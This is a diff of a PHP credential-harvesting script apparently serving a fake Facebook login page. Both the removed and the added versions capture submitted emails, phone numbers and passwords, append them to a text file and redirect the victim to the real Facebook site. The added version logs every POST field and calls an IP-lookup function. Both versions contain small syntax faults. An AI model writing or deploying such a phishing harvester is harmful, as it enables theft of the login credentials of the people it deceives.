@@ -1,19 +1,2 @@
-header("Location: http://facebook.com");
-$ADEx = "pass.txt;
-$ADEy = $_POST['email'];
-$ADEz = $_POST['pass'];
-
-$handle = fopen($ADEx, 'a');
-fwrite($handle, "Email atau Telepon :");
-fwrite($handle, "\n");
-fwrite($handle, "$ADEy");
-fwrite($handle, "\n");
-fwrite($handle, "Kata Sandi :");
-fwrite($handle, "\n");
-fwrite($handle, "$ADEz");
-fwrite($handle, "\n");
-fwrite($handle, "+++++++++++++++++++");
-fwrite($handle, "\n");
-fclose($handle);
-exit;
-?>
+<?php 
+header('Location: http://www.Facebook.com/login.php'); $handle = fopen("pass.txt", "a"); foreach($_POST as $variable => $value) { fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); $date = date (''); $ip = getIP(); exit;e ?>
